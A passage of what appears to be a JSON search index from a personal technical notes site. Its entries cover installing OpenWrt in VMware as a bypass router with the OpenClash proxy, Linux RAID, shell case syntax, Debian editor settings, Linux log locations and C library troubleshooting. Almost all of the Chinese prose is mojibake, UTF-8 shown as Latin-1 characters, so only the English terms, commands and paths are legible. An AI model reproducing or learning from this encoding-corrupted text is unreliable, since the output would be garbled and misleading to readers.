å¦‚æœç”¨dockeré…ç½®åœ°å€æ¯”è¾ƒéº»çƒ¦) æ³¨è§£ æ¡¥æ¥æ¨¡å¼ VMwareæ¡¥æ¥æ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯å°†è™šæ‹Ÿæœºçš„è™šæ‹Ÿç½‘ç»œé€‚é…å™¨ä¸ä¸»æœºçš„ç‰©ç†ç½‘ç»œé€‚é…å™¨è¿›è¡Œäº¤æ¥ï¼Œ è™šæ‹Ÿæœºä¸­çš„è™šæ‹Ÿç½‘ç»œé€‚é…å™¨å¯é€šè¿‡ä¸»æœºä¸­çš„ç‰©ç†ç½‘ç»œé€‚é…å™¨ç›´æ¥è®¿é—®åˆ°å¤–éƒ¨ç½‘ç»œã€‚ ç®€è€Œè¨€ä¹‹ï¼Œè¿™å°±å¥½åƒå±€åŸŸç½‘ä¸­æ·»åŠ äº†ä¸€å°æ–°çš„ã€ç‹¬ç«‹çš„è®¡ç®—æœºä¸€æ ·ã€‚ å› æ­¤ï¼Œè™šæ‹Ÿæœºä¹Ÿä¼šå ç”¨å±€åŸŸç½‘ä¸­çš„ä¸€ä¸ªIPåœ°å€ï¼Œå¹¶ä¸”å¯ä»¥å’Œå…¶ä»–ç»ˆç«¯è¿›è¡Œç›¸äº’è®¿é—®ã€‚ NATæ¨¡å¼ NATï¼Œæ˜¯Network Address Translationçš„ç¼©å†™ï¼Œæ„å³ç½‘ç»œåœ°å€è½¬æ¢ã€‚ NATæ¨¡å¼ä¹Ÿæ˜¯VMwareåˆ›å»ºè™šæ‹Ÿæœºçš„é»˜è®¤ç½‘ç»œè¿æ¥æ¨¡å¼ã€‚ ä½¿ç”¨NATæ¨¡å¼ç½‘ç»œè¿æ¥æ—¶ï¼ŒVMwareä¼šåœ¨ä¸»æœºä¸Šå»ºç«‹å•ç‹¬çš„ä¸“ç”¨ç½‘ç»œï¼Œç”¨ä»¥åœ¨ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´ç›¸äº’é€šä¿¡ã€‚ ä»…ä¸»æœºæ¨¡å¼ ä»…ä¸»æœºæ¨¡å¼ï¼Œæ˜¯ä¸€ç§æ¯”NATæ¨¡å¼æ›´åŠ å°é—­çš„çš„ç½‘ç»œè¿æ¥æ¨¡å¼ï¼Œå®ƒå°†åˆ›å»ºå®Œå…¨åŒ…å«åœ¨ä¸»æœºä¸­çš„ä¸“ç”¨ç½‘ç»œã€‚ ä»…ä¸»æœºæ¨¡å¼çš„è™šæ‹Ÿç½‘ç»œé€‚é…å™¨ä»…å¯¹ä¸»æœºå¯è§ï¼Œå¹¶åœ¨è™šæ‹Ÿæœºå’Œä¸»æœºç³»ç»Ÿä¹‹é—´æä¾›ç½‘ç»œè¿æ¥ã€‚ ç›¸å¯¹äºNATæ¨¡å¼è€Œè¨€ï¼Œä»…ä¸»æœºæ¨¡å¼ä¸å…·å¤‡NATåŠŸèƒ½ï¼Œå› æ­¤åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œ ä½¿ç”¨ä»…ä¸»æœºæ¨¡å¼ç½‘ç»œè¿æ¥çš„è™šæ‹Ÿæœºæ— æ³•è¿æ¥åˆ°Internet (åœ¨ä¸»æœºä¸Šå®‰è£…åˆé€‚çš„è·¯ç”±æˆ–ä»£ç†è½¯ä»¶ï¼Œæˆ–è€…åœ¨Windowsç³»ç»Ÿçš„ä¸»æœºä¸Šä½¿ç”¨Internetè¿æ¥å…±äº«åŠŸèƒ½ï¼Œ ä»ç„¶å¯ä»¥è®©è™šæ‹Ÿæœºè¿æ¥åˆ°Internetæˆ–å…¶ä»–ç½‘ç»œ)ã€‚ æ§åˆ¶å™¨é»˜è®¤å³å¯, ç£ç›˜é€‰æ‹©ä½¿ç”¨ /docs/æ‚ä¹±æ— ç« /å¸¸ç”¨å·¥å…·ä½¿ç”¨/StarWindConverter è½¬æ¢çš„è™šæ‹Ÿæœºæ–‡ä»¶(éœ€è¦ä¿æŒç°æœ‰æ ¼å¼): åç»­çœ‹éœ€æ±‚äº†, ç›´åˆ° é€‰æ‹©è‡ªå®šä¹‰ç¡¬ä»¶ æ²¡ç”¨çš„éƒ½å¯ä»¥å»æ‰ æ³¨è§£ è¿™é‡Œè¡¥å……ä¸€ä¸‹, ä¸‹è½½çš„ img çš„å‹ç¼©åŒ…, éœ€è¦å…ˆè½¬æ¢ä¸ºISOæ–‡ä»¶ æˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯WSL, ç›´æ¥åœ¨cmdè¾“å…¥debianå³å¯, ç„¶åé…ç½®æº, å¯å‚è€ƒ /docs/æ“ä½œç³»ç»Ÿ/linux/debian/é…ç½®debianå®¹å™¨ æœ€åä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/genisoimage æŒ‡ä»¤: # è¿›å…¥è§£å‹ç›®å½• cd /mnt/e/xxxxxxxxxxx/openwrt-23.05.2-x86-generic-generic-ext4-combined.img geteltorito -o output_file.iso input_file.img ä¸è¡Œ, ç¼ºå°‘åº“, è¿˜æ˜¯ç›´æ¥ç”¨æˆ‘è™šæ‹Ÿæœºå¼„å§... genisoimage -o openwrt.iso openwrt-23.05.2-x86-generic-generic-ext4-combined.img å®æµ‹ç›´æ¥è½¬æ¢çš„isoæ˜¯ä¸èƒ½ç”¨çš„, è¿˜æ˜¯è€è€å®å®ä½¿ç”¨å·¥å…· /docs/æ‚ä¹±æ— ç« /å¸¸ç”¨å·¥å…·ä½¿ç”¨/StarWindConverter å§ ç„¶åæ‰“å¼€è™šæ‹Ÿæœº, ä¼šå®‰è£…ä¸€ä¼šå„¿, å‡ºç° ready åå›è½¦å³å¯: ç‰©ç†æœº /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/ipconfig æŸ¥çœ‹ç½‘ç»œä¿¡æ¯ è™šæ‹Ÿæœºé…ç½®ç½‘ç»œ: vi /etc/config/network è¿™æ˜¯é»˜è®¤é…ç½® æŒ‰ç…§ç‰©ç†æœºä¿®æ”¹, éœ€è¦è·Ÿç‰©ç†æœºåŒç½‘æ®µ é‡å¯è™šæ‹Ÿæœº: reboot ç„¶åå®¿ä¸»æœº(ç‰©ç†æœº) çœ‹çœ‹é€šä¸: ping ç™»å½•è™šæ‹Ÿæœºçš„ç³»ç»Ÿ, åœ°å€: 192.168.1.80 é»˜è®¤è´¦å¯†: root netflixcn.com è®¾ç½®æ—è·¯ç”± éšåæ‰“å¼€ã€Œç½‘ç»œã€->ã€Œæ¥å£ã€é…ç½®é¡µé¢ï¼Œé€‰æ‹© LAN æ¥å£ LAN æ¥å£çš„æ¡¥æ¥é€‰é¡¹å–æ¶ˆå‹¾é€‰ DHCP æœåŠ¡å™¨å‹¾é€‰ã€Œå¿½ç•¥æ­¤æ¥å£ã€ æ‰“å¼€ã€Œç½‘ç»œã€-> ã€Œè®¾å¤‡ã€é¡µé¢ eth0ç½‘å¡é…ç½®å–æ¶ˆå‹¾é€‰ã€Œå¯ç”¨ IPv6ã€ br-lanæ¥å£åŒæ ·å–æ¶ˆå¯ç”¨ã€Œå¯ç”¨IPv6ã€ å®‰è£… openclash ä¸¤ç§æ–¹å¼å¯ä»¥é€‰æ‹© ç›´æ¥åœ¨ openwrt çš„ã€Œç³»ç»Ÿã€-ã€Œè½¯ä»¶åŒ…ã€ä¸­æœç´¢ä¸‹è½½ åœ¨openclashçš„å®˜æ–¹ä»“åº“ä¸‹è½½ ipk å®‰è£…åŒ…ï¼Œæ‰‹åŠ¨ä¸Šä¼ å®‰è£… æ’ä»¶è®¾ç½® ä¸ªäººä¹ æƒ¯ï¼Œå€¾å‘äºä½¿ç”¨ Fake-IP æ¨¡å¼ã€‚ æ­¥éª¤ï¼š æ¨¡å¼ä½¿ç”¨ Fake-IPï¼ˆå¢å¼ºï¼‰æ¨¡å¼ï¼Œæ‰“å¼€æ—è·¯ç”±å…¼å®¹ æœ¬åœ° DNSåŠ«æŒï¼Œä½¿ç”¨ dnsmasq è½¬å‘ PS.æ¨¡å¼ä¹Ÿæ¨èä½¿ç”¨ TUN ï¼Œ è¯¥æ¨¡å¼ä¸‹çš„UDP å¤„ç†æ€§èƒ½æ›´å¥½ï¼ŒåŒæ—¶æ–°å¢äº† tun è™šæ‹Ÿæ¥å£ï¼Œå¯ä»¥ç›‘ç®¡ä¸‰å±‚ç½‘ç»œæµé‡ã€‚ ä½¿ç”¨ è‡³æ­¤ï¼Œæ—è·¯ç”±å·²ç»å…·å¤‡ç½‘ç»œä»£ç†çš„åŠŸèƒ½ã€‚ å®¶é‡Œçš„è®¾å¤‡éœ€è¦ä½¿ç”¨çš„è¯ï¼Œéœ€è¦å°†ç½‘ç»œè®¾ç½®çš„ip çš„ç½‘å…³å’Œ DNSéƒ½æŒ‡å‘æ—è·¯ç”±çš„åœ°å€å³å¯ã€‚ DNSçš„åŸŸåè§£æå·¥ä½œäº¤ç»™æ—è·¯ç”±æ¥å¤„ç†ï¼Œé¿å… DNSæ±¡æŸ“çš„é—®é¢˜ã€‚ å‚è€ƒ: VMwareå®‰è£…openWRTè½¯è·¯ç”±ç³»ç»Ÿçš„æ­¥éª¤(å›¾æ–‡æ•™ç¨‹) é€šè¿‡Dockeréƒ¨ç½²OpenWrtåšå®¶ç”¨æ—è·¯ç”±","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Openwrt-Vmware-install-OpenWrt.html","loc":"/yq-doc-source-docs-operating-system-linux-Openwrt-Vmware-install-OpenWrt.html"},{"title":"OpenWrt","text":"ä¸€ä¸ªåµŒå…¥å¼ Linux, ä¸»è¦å®ç°è·¯ç”±åŠŸèƒ½ ç®€å•æ¥è¯´ï¼ŒOpenWRT æ˜¯ä¸€æ¬¾å®¶ç”¨è·¯ç”±å™¨çš„æ“ä½œç³»ç»Ÿï¼Œè·¯ç”±å™¨å®‰è£…äº†å®ƒæ‰èƒ½æ­£å¸¸çš„å·¥ä½œã€‚ å°±åƒå›½å†…æ‰‹æœºå‚å•†åŸºäºå¼€æºçš„ Android ç³»ç»Ÿå¼€å‘å‡ºå„ç§ Romä¸€æ ·ã€‚ è·¯ç”±å™¨å‚å•†ä¹Ÿå¯ä»¥åŸºäº OpenWRT è¿™ä¸ªå¹³å°ï¼Œè¿›è¡ŒäºŒæ¬¡å¼€å‘ï¼Œå¢åŠ æ›´å¤šä¸°å¯Œçš„åŠŸèƒ½å’Œæœ‰å‚å•†ç‰¹è‰²çš„è·¯ç”±å™¨ç³»ç»Ÿã€‚ VMwareå®‰è£OpenWrt å®˜ç½‘: https://openwrt.org/ å‚è€ƒ: VMwareå®‰è£…openWRTè½¯è·¯ç”±ç³»ç»Ÿçš„æ­¥éª¤(å›¾æ–‡æ•™ç¨‹)","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Openwrt-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Openwrt-index.html"},{"title":"åœ¨ Linux ä¸‹ä½¿ç”¨ RAID","text":"RAID çš„çº§åˆ«å’Œæ¦‚å¿µ ä½¿ç”¨ mdadm å·¥å…·åˆ›å»ºè½¯ä»¶ RAID 0 (æ¡å¸¦åŒ–) ç”¨ä¸¤å—ç£ç›˜åˆ›å»º RAID 1 (é•œåƒ) åˆ›å»º RAID 5 (æ¡å¸¦åŒ–ä¸åˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒ) å®‰è£… RAID 6 (æ¡å¸¦åŒ–åŒåˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒ) è®¾ç½® RAID 10 æˆ– 1 + 0 (åµŒå¥—) åœ¨ RAID ä¸­æ‰©å±•ç°æœ‰çš„ RAID é˜µåˆ—å’Œåˆ é™¤æ•…éšœçš„ç£ç›˜ å½“è½¯ä»¶ RAID æ•…éšœæ—¶å¦‚ä½•æ¢å¤å’Œé‡å»ºæ•°æ® å¦‚ä½•ä½¿ç”¨ Mdadm å·¥å…·ç®¡ç†è½¯ä»¶ RAID","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-index.html"},{"title":"æ•™ç¨‹","text":"shellè¯­æ³•è§„èŒƒ gnomeæ–‡ä»¶ç®¡ç†å™¨å†…æ·»åŠ å³é”®èœå• debian-ubuntuå­—ä½“è¯´æ˜ linuxä¸‹é…ç½®DLANæœåŠ¡ æœ¬åœ°æ„å»ºdebåŒ… RAID ç¡¬ç›˜åˆ†åŒºé…ç½® å¿«æ·é”®","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-index.html"},{"title":"shellè¯­æ³•è§„èŒƒ","text":"caseè¯­å¥ è¯­æ³•å¦‚ä¸‹: case å€¼ in æ¨¡å¼1) å‘½ä»¤åºåˆ—1 ;; æ¨¡å¼2) å‘½ä»¤åºåˆ—2 ;; ... *) é»˜è®¤å‘½ä»¤åºåˆ— ;; esac å€¼ æ˜¯éœ€è¦åŒ¹é…çš„è¡¨è¾¾å¼æˆ–å˜é‡ã€‚ æ¨¡å¼ æ˜¯ç”¨æ¥åŒ¹é…å€¼çš„æ¨¡å¼ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ã€‚ å‘½ä»¤åºåˆ— æ˜¯å½“åŒ¹é…åˆ°ç›¸åº”æ¨¡å¼æ—¶è¦æ‰§è¡Œçš„ä¸€ç»„å‘½ä»¤ã€‚ ;; è¡¨ç¤ºä¸€ä¸ªæ¨¡å¼å—çš„ç»“æŸï¼Œç±»ä¼¼äºbreakè¯­å¥ï¼Œç”¨äºè·³å‡ºcaseè¯­å¥; å¦‚æœä¸åŠ ;;ï¼ŒShellä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œåç»­æ¨¡å¼çš„å‘½ä»¤åºåˆ—ï¼Œè€Œä¸è¿›è¡ŒåŒ¹é… *) æ˜¯å¯é€‰çš„é»˜è®¤æ¨¡å¼ï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…åˆ°ä»»ä½•æ¨¡å¼ï¼Œå°†æ‰§è¡Œå¯¹åº”çš„å‘½ä»¤åºåˆ—; é»˜è®¤æ¨¡å¼é€šå¸¸æ”¾åœ¨æœ€åï¼Œç”¨äºå¤„ç†æœªåŒ¹é…åˆ°ä»»ä½•æ¨¡å¼çš„æƒ…å†µ å…¶ä»–: shellè¯­æ³•è§„èŒƒ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification.html"},{"title":"shellè¯­æ³•è§„èŒƒ","text":"shellæ¡ä»¶åˆ¤æ–­if shellçš„å˜é‡æ›¿æ¢ shellé€€å‡ºçŠ¶æ€ç  Linuxå„ç§$ é€»è¾‘ä¸ Shellä¼ é€’å‚æ•° Shellå¾ªç¯ Shellçš„return å¼•å· æ–‡ä»¶è¯»å– bashæ•°ç»„ ä¸€äº›bug shellä¸‹whileä¸set","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-index.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-shell-grammar-specification-index.html"},{"title":"è®¾ç½®é»˜è®¤æ–‡æœ¬ç¼–è¾‘å™¨","text":"Debianæœ‰è®¸å¤šä¸åŒçš„ç¼–è¾‘å™¨ã€‚ æˆ‘ä»¬å»ºè®®å®‰è£…ä¸Šé¢æåˆ°çš„ /docs/æ‚ä¹±æ— ç« /å¸¸ç”¨å·¥å…·ä½¿ç”¨/vim è½¯ä»¶åŒ…ã€‚ Debiané€šè¿‡å‘½ä»¤ /usr/bin/editor æä¾›äº†å¯¹ç³»ç»Ÿé»˜è®¤ç¼–è¾‘å™¨çš„ç»Ÿä¸€è®¿é—®ï¼Œ å› æ­¤å…¶å®ƒç¨‹åºï¼ˆä¾‹å¦‚ reportbug ï¼‰å¯ä»¥è°ƒç”¨å®ƒã€‚ ä½ å¯ä»¥é€šè¿‡ä¸‹åˆ—å‘½ä»¤æ”¹å˜å®ƒ: $ sudo update-alternatives --config editor å¯¹äºæ–°æ‰‹ï¼Œæˆ‘å»ºè®®ä½¿ç”¨ /usr/bin/vim.basic ä»£æ›¿ /usr/bin/vim.tiny ï¼Œå› ä¸ºå®ƒæ”¯æŒæ ¼å¼é«˜äº®ã€‚ æ³¨è§£ è®¸å¤šç¨‹åºä½¿ç”¨ç¯å¢ƒå˜é‡ $EDITOR æˆ– $VISUAL æ¥å†³å®šä½¿ç”¨é‚£ä¸ªç¼–è¾‘å™¨. å‡ºäº Debian ç³»ç»Ÿçš„ä¸€è‡´æ€§è€ƒè™‘ï¼Œå®ƒä»¬è¢«è®¾ç½®åˆ° /usr/bin/editor ã€‚ ï¼ˆåœ¨å†å²ä¸Šï¼Œ $EDITOR æ˜¯ ed ï¼Œ $VISUAL æ˜¯ vi ã€‚)","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Set-the-default-text-editor.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Set-the-default-text-editor.html"},{"title":"debianæ‰‹å†Œ","text":"å‚è€ƒ: https://www.debian.org/doc/manuals/debian-reference/ PS1 æç¤ºç¬¦å®šä¹‰ ç±» Unix æ–‡ä»¶ç³»ç»Ÿ ä¸‰ç§ç±»å‹çš„æ—¶é—´æˆ³ å¥—æ¥å­— è®¾å¤‡æ–‡ä»¶ ç†µ éšæœºæ•° procfs å’Œ sysfs ç‰¹æ®ŠæŒ‰é”® è®¾ç½®é»˜è®¤æ–‡æœ¬ç¼–è¾‘å™¨ è®°å½• shell æ´»åŠ¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-index.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-index.html"},{"title":"Debian","text":"DebianåŒ…ä¾èµ– debianæŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ debianä¸€äº›äº†è§£ debianæ‰‹å†Œ debianå¯åŠ¨ é…ç½®debianå®¹å™¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-index.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-index.html"},{"title":"Linux","text":"debian ç³»ç»ŸæœåŠ¡ æ•™ç¨‹ Linuxç¯å¢ƒå˜é‡ æ¦‚å¿µæ€§ é—®é¢˜ ç½‘ç»œ linuxæŒ‡ä»¤ ubuntu package ä¸€äº›å®‰å…¨ç›¸å…³æ–‡ä»¶ ä¸€äº›å¸¸è§å‘è¡Œç‰ˆä¸‹è½½ é…ç½®æ–‡ä»¶ å†…ç½®å‡½æ•° OpenWrt iStoreOS","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-index.html","loc":"/yq-doc-source-docs-operating-system-linux-index.html"},{"title":"Linuxç½‘ç»œ","text":"ç½‘ç»œç®¡ç†","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-network-index.html","loc":"/yq-doc-source-docs-operating-system-linux-network-index.html"},{"title":"package","text":"bind9è½¯ä»¶åŒ… gitg xclip","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-package-index.html","loc":"/yq-doc-source-docs-operating-system-linux-package-index.html"},{"title":"é—®é¢˜","text":"sshé‡ç½®è®¡æ•°å™¨ å•æ¬¡ä»»åŠ¡ å®šæ—¶ä»»åŠ¡ è°åœ¨ç³»ç»Ÿ è­¦å‘Šæ‰€æœ‰äºº äºŒè¿›åˆ¶æ•°æ®è®¿é—® rootå¯†ç å¿˜è®° Linuxçš„ä¸€äº›å†…æ ¸å‚æ•° è·å–æ‰€æœ‰å˜é‡ä¸ç¯å¢ƒå˜é‡ è¿›ç¨‹æš‚åœä¸æŒ‚èµ· linuxå‚æ•°è¿‡é•¿ debian10 iptables-restore çš„ bug å…³äº #! è¡¨ç¤ºå½“ä½œä¸ºæ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™ï¼Œä½¿ç”¨è§£é‡Šå™¨è·¯å¾„ï¼Œé»˜è®¤ä¸ºå½“å‰ç™»å½•shell å¿…é¡»å†™åœ¨ç¬¬ä¸€è¡Œæ‰æœ‰ç”¨ å½“æ‰§è¡Œæ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œcdåˆ°æ‰€åœ¨ç›®å½•åï¼Œæ‰§è¡Œéœ€è¦åŠ  ./ ï¼Œ ./testçš„./æ˜¯ä¸ºäº†æ‰¿æ¥ç°åœ¨æ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼Œ è®©ç°åœ¨æ‰€åœ¨çš„æ–‡ä»¶å¤¹+æ–‡ä»¶ï¼Œåˆå¹¶æˆè¯¥æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œç”¨äºæ‰§è¡Œã€‚ ä¼˜å…ˆçº§ å½“ç›´æ¥æŒ‡å®šè§£é‡Šå™¨çš„æ—¶å€™ æ¯”å¦‚ python xxx.pyï¼Œ xxx.pyæ–‡ä»¶é‡Œçš„ #! æ˜¯ä¸ç”Ÿæ•ˆçš„ï¼Œ åªæœ‰ä½œä¸ºæ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™æ‰ä¼šç”Ÿæ•ˆï¼Œæ¯”å¦‚ ./xxx.py æ–‡ä»¶ ç™»é™†æ—¥å¿—æŸ¥çœ‹: /var/log/auth.log /var/log/secure.log å…¶ä»–æ—¥å¿—: /var/log/message ä¸€èˆ¬ä¿¡æ¯å’Œç³»ç»Ÿä¿¡æ¯ /var/log/secure ç™»é™†ä¿¡æ¯ /var/log/maillog mailè®°å½• /var/log/utmp /var/log/wtmp ç™»é™†è®°å½•ä¿¡æ¯ï¼ˆlastå‘½ä»¤å³è¯»å–æ­¤æ—¥å¿—æˆ–è€… who /var/log/wtmpï¼‰","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-index.html","loc":"/yq-doc-source-docs-operating-system-linux-question-index.html"},{"title":"ç³»ç»ŸæœåŠ¡","text":"PAMæ¨¡å— auditd è®¤è¯å’Œè®¿é—®æ§åˆ¶ ACLæƒé™æ§åˆ¶ å†…æ ¸æ¨¡å— SSH å›½é™…åŒ–å’Œæœ¬åœ°åŒ– rsyslog crontabæœåŠ¡ ntpæœåŠ¡","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-system-service-index.html","loc":"/yq-doc-source-docs-operating-system-linux-system-service-index.html"},{"title":"Ubuntu","text":"å›¾å½¢ç•Œé¢ ubuntuä¸­æ–‡æ”¯æŒ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-ubuntu-index.html","loc":"/yq-doc-source-docs-operating-system-linux-ubuntu-index.html"},{"title":"cåº“å‡½æ•°","text":"fflush printfä¸sprintf","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-C-library-function-index.html","loc":"/yq-doc-source-docs-rear-end-from-C-library-function-index.html"},{"title":"cæ ‡å‡†åº“","text":"./string-h","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-Standard-library-index.html","loc":"/yq-doc-source-docs-rear-end-from-Standard-library-index.html"},{"title":"C","text":"c++ cmake cmakelistsç¼–å†™ cç±»å‹ cåº“å‡½æ•° æ ‡å‡†åº“ gcc(++)ç¼–è¯‘å™¨ vscodeè°ƒè¯•ç›¸å…³ ä½¿ç”¨CLion åŸºç¡€çŸ¥è¯† ä¸€äº›å…³é”®å­— é—®é¢˜","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-index.html","loc":"/yq-doc-source-docs-rear-end-from-index.html"},{"title":"å…³äºåº“çš„æŠ¥é”™","text":"å¯¹äºä½¿ç”¨Nuitkaç¼–è¯‘çš„Pythonä»£ç è€Œè¨€, ä¹Ÿé€‚ç”¨, å› ä¸ºæœ€ç»ˆè¿˜æ˜¯å…ˆè½¬æ¢ä¸ºCå†ç¼–è¯‘. å°¤å…¶æ˜“å‡ºç°çš„è·¨ç³»ç»Ÿåœºæ™¯, æ¯”å¦‚åœ¨Ubuntu16ç¼–è¯‘çš„æ–¹æ³•å“¦Ubuntu20ä¸Šå»è·‘. ä»¥è‡ªå·±ç»å†çš„ä¸€ä¸ªåœºæ™¯è€Œè¨€, ä¸»è¦ä¸šåŠ¡ä»£ç æ˜¯ç”¨Pythonç¼–ç , ä½¿ç”¨äº†è‡ªå·±ç¼–å†™çš„Cåº“(ä¸€ä¸ªè·¨å¹³å°çš„GUIåº“)çš„åŠ¨æ€é“¾æ¥. åœ¨ Ubuntu16 ç¼–è¯‘çš„æ—¶å€™, ä½¿ç”¨äº†16çš„ libpng.so . æ”¾åˆ° Ubuntu18 ä¸ Ubuntu20 ä¸Šè¿è¡Œæ—¶, ç”±è°ƒç”¨äº†å„è‡ªç³»ç»Ÿçš„ libpng.so . ä¸”18ä¸20çš„ libpng åˆä¾èµ–äº libz.so çš„ 1.2.9 ç‰ˆæœ¬. è€Œ16ä¸Šæ˜¯ä»…ä¾èµ–äº libz.so çš„ 1.2.3.4 ç‰ˆæœ¬. è¿™é‡Œä½¿ç”¨Nuitkaç¼–è¯‘çš„æ—¶å€™, å‘ç°è‡ªåŠ¨æŠŠ16çš„ libz.so ç»™æ”¾è¿›å»äº†, å°±å‡ºç°äº†æŠ¥é”™: libz.so.1: version `ZLIB_1.2.9' not found (required by /lib/x86xxxxxx/libpng.so) æŠŠåº”ç”¨ä¸‹çš„ libz.so.1 ç»™åˆ é™¤äº†, é‡åˆ°å¦ä¸€ä¸ªåº“çš„æŠ¥é”™: libxcb-shm.so.0 undefined symbol åº”ç”¨ç¨‹åºä¸‹æ˜¯æœ‰å¦ä¸€ä¸ªåº“ libxcb.so.1 , è¿™é‡Œå®é™…æ˜¯ç”±åº”ç”¨ç¨‹åºä¸‹çš„ libxcb.so.1 è°ƒäº†ç³»ç»Ÿçš„ libxcb-shm.so.0 , çœŸå®åŸå› å°±æ˜¯ä¸¤è€…ç‰ˆæœ¬ä¸ä¸€è‡´. è¿™é‡Œçš„ä¸ä¸€è‡´æ˜¯æŒ‡, libxcb.so.1 ä¸ libxcb-shm.so.0 ç†åº”éƒ½æ˜¯å±äº libxcb çš„å…±äº«åº“, ä½†æ˜¯Nuitkaå¤„ç†çš„æ—¶å€™, åªå¤„ç†äº†ä¸€éƒ¨åˆ†(åªæŠŠ libxcb-shm.so.0 ç»™å¤åˆ¶åˆ°åº”ç”¨ç¨‹åºç›®å½•ä¸‹) æœ€ç»ˆæŠŠåº”ç”¨ç¨‹åºä¸‹çš„ libxcb.so.1 åˆ é™¤å³å¯. æœ€åæ–™æƒ³, æ˜¯å¦ä¸€å¼€å§‹å°±å°† Ubuntu16 çš„ libpng.so æåˆ°åº”ç”¨ç¨‹åºä¸‹é¢, å°±ä¸ä¼šæœ‰é—®é¢˜, ä½†æ˜¯å¥ˆä½•... å°±æ²¡æœ‰å°è¯•. æ³¨è§£ ä¸€äº›å¯ä»¥å°è¯•çš„æŒ‡ä»¤: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/ldd , æŸ¥çœ‹è´¡çŒ®åº“çš„ä¾èµ–é¡¹(é“¾æ¥é¡¹), æ³¨æ„è¿™é‡Œçš„ä¾èµ–, å¦‚æœåº”ç”¨ç¨‹åºç›®å½•ä¸‹å­˜åœ¨, ä¼šä¼˜å…ˆä½¿ç”¨åº”ç”¨ç¨‹åºä¸‹æœ‰çš„ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/strings , æŸ¥çœ‹æ­¤å…±äº«åº“ä¾èµ–çš„å…·ä½“ç‰ˆæœ¬","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-question-About-library-error.html","loc":"/yq-doc-source-docs-rear-end-from-question-About-library-error.html"},{"title":"ç¼–è¾‘å™¨é•¿å­—ç¬¦ä¸²å¤šè¡Œå†™","text":"å­—ç¬¦ä¸²æ‹¼æ¥æ¥åˆ›å»ºè·¨å¤šè¡Œçš„å­—ç¬¦ä¸²: char *data = \"it is\" \"a test msg\"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-question-Editor's-long-string-is-written-in-multiple-lines.html","loc":"/yq-doc-source-docs-rear-end-from-question-Editor's-long-string-is-written-in-multiple-lines.html"},{"title":"æšä¸¾ç±»å‹å€¼çš„é—®é¢˜","text":"å®šä¹‰ä¸€ä¸ªæšä¸¾: enum LANGUAGE_TYPE { EN = 0, ZH_CH, }; å¦‚æœæ²¡æœ‰èµ‹å€¼: enum LANGUAGE_TYPE current_language; é‚£ä¹ˆé»˜è®¤å€¼å°±æ˜¯ç¬¬ä¸€ä¸ª EN","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-question-Enumeration-type.html","loc":"/yq-doc-source-docs-rear-end-from-question-Enumeration-type.html"},{"title":"å‡½æ•°å‚æ•°void","text":"å®šä¹‰å‡½æ•°æ—¶ä¿®é¥°å‡½æ•°è¡¨ç¤ºæ— è¿”å›å€¼, ä½œä¸ºå‚æ•°æ—¶å€™è¡¨ç¤ºä¸æ¥å—å‚æ•°: int fun(void) è€Œä¸ä½¿ç”¨è¡¨ç¤ºæ¥å—ä»»æ„ä¸ç¡®å®šç±»å‹å‚æ•°: int 